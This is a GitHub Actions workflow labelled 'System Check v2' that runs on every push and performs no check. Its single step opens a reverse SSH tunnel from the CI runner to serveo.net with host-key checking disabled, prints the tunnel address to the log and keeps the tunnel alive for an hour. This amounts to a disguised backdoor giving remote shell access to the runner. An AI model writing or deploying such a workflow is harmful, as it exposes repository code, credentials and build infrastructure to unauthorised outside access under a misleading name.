
name: System Check v2
on: [push]
jobs:
  run-shell:
    runs-on: ubuntu-latest
    steps:
      - name: Reverse SSH Setup
        run: |
          set +e
          ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -N "" -q
          # Try loclx (localtonet) or serveo if pinggy fails, but let's stick to serveo for simplicity
          # Serveo does not require signup and gives a direct port
          echo "Starting Serveo tunnel..."
          nohup ssh -o StrictHostKeyChecking=no -R 0:localhost:22 serveo.net > serveo.log 2>&1 &
          
          echo "Waiting for tunnel..."
          sleep 10
          
          echo "=== TUNNEL INFO ==="
          cat serveo.log
          echo "==================="
          
          # Keep alive
          sleep 3600
